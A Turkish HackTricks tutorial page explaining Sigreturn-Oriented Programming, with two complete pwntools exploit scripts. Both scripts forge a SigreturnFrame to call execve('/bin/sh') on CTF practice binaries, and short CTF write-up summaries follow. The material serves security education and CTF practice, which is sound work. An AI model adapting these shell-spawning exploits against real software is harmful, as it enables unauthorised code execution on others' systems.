# SROP - Sigreturn-Oriented Programming

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## Temel Bilgiler

**`Sigreturn`,** genellikle bir sinyal işleyicisi işlemini tamamladıktan sonra temizlik yapmak için kullanılan özel bir **sistem çağrısıdır**. Sinyaller, genellikle bir istisnai durumun meydana geldiğini belirtmek için işletim sistemi tarafından bir programa gönderilen kesintilerdir. Bir program bir sinyal aldığında, mevcut çalışmasını geçici olarak durdurarak sinyali bir **sinyal işleyici** ile işlemek üzere tasarlanmış özel bir işlevle ele alır.

Sinyal işleyicisi işini bitirdikten sonra, programın **önceki durumuna geri dönmesi** gerekir, sanki hiçbir şey olmamış gibi. İşte burada **`sigreturn`** devreye girer. Programı, sinyal işleyicisinden **geri dönmeye** ve sinyal işleyicisi tarafından kullanılan **yığın çerçevesini** (işlev çağrılarını ve yerel değişkenleri depolayan bellek bölümü) temizleyerek programın durumunu geri yüklemeye yardımcı olur.

İlginç olan kısım, **`sigreturn`**'un programın durumunu nasıl geri yüklediğidir: bunu yaparak, **CPU'nun tüm kayıt değerlerini yığında depolar.** Sinyal artık engellenmediğinde, **`sigreturn` bu değerleri yığından çıkarır**, CPU'nun kayıtçılarını etkin bir şekilde sinyalin ele alınmadan önceki durumlarına sıfırlar. Bu, mevcut yığının en üstüne işaret eden yığın işaretçi kaydını (RSP) de içerir.

{% hint style="danger" %}
Bir ROP zincirinden **`sigreturn`** sistem çağrısını çağırarak ve **yığında yüklemek istediğimiz kayıt değerlerini ekleyerek** tüm kayıt değerlerini **kontrol etmek** ve dolayısıyla örneğin `execve` sistem çağrısını `/bin/sh` ile **çağırmak mümkündür.**
{% endhint %}

Dikkat edin, bu, diğer Ret2syscall'ları çağırmak için parametreleri kontrol etmeyi çok daha kolay hale getiren bir **Ret2syscall türü** olacaktır:

{% content-ref url="rop-syscall-execv/" %}
[rop-syscall-execv](rop-syscall-execv/)
{% endcontent-ref %}

Merak ediyorsanız, bu, daha sonra değerleri kurtarmak için yığında depolanan **sigcontext yapısı**'dır (şemayı [**buradan**](https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html) alın):
```
+--------------------+--------------------+
| rt_sigeturn()      | uc_flags           |
+--------------------+--------------------+
| &uc                | uc_stack.ss_sp     |
+--------------------+--------------------+
| uc_stack.ss_flags  | uc.stack.ss_size   |
+--------------------+--------------------+
| r8                 | r9                 |
+--------------------+--------------------+
| r10                | r11                |
+--------------------+--------------------+
| r12                | r13                |
+--------------------+--------------------+
| r14                | r15                |
+--------------------+--------------------+
| rdi                | rsi                |
+--------------------+--------------------+
| rbp                | rbx                |
+--------------------+--------------------+
| rdx                | rax                |
+--------------------+--------------------+
| rcx                | rsp                |
+--------------------+--------------------+
| rip                | eflags             |
+--------------------+--------------------+
| cs / gs / fs       | err                |
+--------------------+--------------------+
| trapno             | oldmask (unused)   |
+--------------------+--------------------+
| cr2 (segfault addr)| &fpstate           |
+--------------------+--------------------+
| __reserved         | sigmask            |
+--------------------+--------------------+
```
Daha iyi bir açıklama için ayrıca şuraya bakabilirsiniz:

{% embed url="https://youtu.be/ADULSwnQs-s?feature=shared" %}

## Örnek

Signeturn çağrısının ROP aracılığıyla oluşturulduğu bir örneği [**burada bulabilirsiniz**](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop/using-srop), buradan ise bu son saldırı:
```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = process()

BINSH = elf.address + 0x1250
POP_RAX = 0x41018
SYSCALL_RET = 0x41015

frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = BINSH           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = SYSCALL_RET

payload = b'A' * 8
payload += p64(POP_RAX)
payload += p64(0xf)         # 0xf is the number of the syscall sigreturn
payload += p64(SYSCALL_RET)
payload += bytes(frame)

p.sendline(payload)
p.interactive()
```
Ayrıca [**buradan exploit**](https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html)'u kontrol edin, burada ikili zaten `sigreturn` çağrısını yapıyordu ve bu nedenle bir **ROP** ile oluşturulması gerekmiyor:
```python
from pwn import *

# Establish the target
target = process("./small_boi")
#gdb.attach(target, gdbscript = 'b *0x40017c')
#target = remote("pwn.chal.csaw.io", 1002)

# Establish the target architecture
context.arch = "amd64"

# Establish the address of the sigreturn function
sigreturn = p64(0x40017c)

# Start making our sigreturn frame
frame = SigreturnFrame()

frame.rip = 0x400185 # Syscall instruction
frame.rax = 59       # execve syscall
frame.rdi = 0x4001ca # Address of "/bin/sh"
frame.rsi = 0x0      # NULL
frame.rdx = 0x0      # NULL

payload = "0"*0x28 # Offset to return address
payload += sigreturn # Function with sigreturn
payload += str(frame)[8:] # Our sigreturn frame, adjusted for the 8 byte return shift of the stack

target.sendline(payload) # Send the target payload

# Drop to an interactive shell
target.interactive()
```
## Diğer Örnekler ve Referanslar

* [https://youtu.be/ADULSwnQs-s?feature=shared](https://youtu.be/ADULSwnQs-s?feature=shared)
* [https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop)
* [https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html](https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html)
* **`sigreturn`** sistem çağrısını çağıran ve ardından **yığın üzerine yazma** izni veren derlemeli ikili. Yığına bir [**ret2syscall**](rop-syscall-execv/) yazmak mümkündür, ardından bir **sigreturn** yapısı aracılığıyla okuma yapılabilir ve bayrak, ikili belleğin içinde bulunmaktadır.
* [https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html](https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html)
* **`sigreturn`** sistem çağrısını çağıran ve ardından **yığın üzerine yazma** izni veren derlemeli ikili. Yığına bir [**ret2syscall**](rop-syscall-execv/) yazmak mümkündür, ardından bir **sigreturn** yapısı aracılığıyla (ikili, `/bin/sh` dizesine sahiptir) okuma yapılabilir.
* [https://guyinatuxedo.github.io/16-srop/inctf17\_stupidrop/index.html](https://guyinatuxedo.github.io/16-srop/inctf17\_stupidrop/index.html)
* 64 bit, relro yok, canary yok, nx, pie yok. `gets` işlevini kötüye kullanarak basit bir tampon taşması, [**ret2syscall**](rop-syscall-execv/) gerçekleştiren bir gadget eksikliği ile gerçekleştirilir. ROP zinciri, `/bin/sh`'yi `.bss`'ye yazmak için tekrar gets çağırarak yazılır, eax'ı `0xf` olarak ayarlamak için **`alarm`** işlevini kötüye kullanır ve bir **SROP** çağrısı yapmak ve bir kabuk çalıştırmak için kullanır.
* [https://guyinatuxedo.github.io/16-srop/swamp19\_syscaller/index.html](https://guyinatuxedo.github.io/16-srop/swamp19\_syscaller/index.html)
* 64 bit derlemeli program, relro yok, canary yok, nx, pie yok. Akış, yığında yazma, birkaç kaydı kontrol etme ve ardından bir sistem çağrısı yapma ve ardından `exit` çağırma izni verir. Seçilen sistem çağrısı, registreleri ayarlayacak bir `sigreturn`'dır ve `eip`'yi önceki bir sistem çağrısı talimatını çağırmak ve `memprotect`'i `rwx` olarak ayarlamak ve ESP'yi ikili alana ayarlamak için hareket ettirecektir. Akışı takip ederek, program ESP'yi tekrar okumak için ikili alana yönlendirecektir, ancak bu durumda ESP bir sonraki talimatı işaret edeceğinden, bir kabuk kodu geçirerek onu bir sonraki talimat olarak yazacak ve çalıştıracaktır.
